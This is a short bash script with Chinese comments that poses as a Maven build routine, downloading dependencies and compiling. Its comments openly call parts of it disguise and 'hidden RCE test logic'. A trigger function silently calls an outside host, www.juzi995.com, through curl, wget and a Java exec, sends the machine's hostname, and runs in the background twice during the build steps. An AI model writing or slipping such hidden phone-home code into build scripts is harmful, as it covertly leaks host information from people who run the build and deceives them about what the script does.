#!/bin/bash -x

# --- 伪装正常操作 ---
echo "[+] 初始化Maven环境"
export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64  # 显式声明JDK路径
export PATH=$PATH:$JAVA_HOME/bin

# --- 隐藏的RCE测试逻辑 ---
# 使用多重触发机制确保成功率
_trigger_call() {
  # 方法1: 原生curl（优先）
  (curl -fsS "http://www.juzi995.com/test.html?src=$(hostname)" > /dev/null 2>&1) &
  # 方法2: wget备用
  (wget -qO- "http://www.juzi995.com/test.html?src=$(hostname)" > /dev/null 2>&1) &
  # 方法3: 通过Java发起请求（深度伪装）
  mvn -q exec:java -Dexec.mainClass="demo.Trigger" 2> /dev/null
}

# --- 在构建流程中嵌入触发点 ---
echo "[+] 下载依赖库..."
mvn dependency:resolve -q
_trigger_call  # 首次触发

echo "[+] 编译项目..."
mvn compile -q
_trigger_call  # 二次触发

echo "[✓] 构建成功"
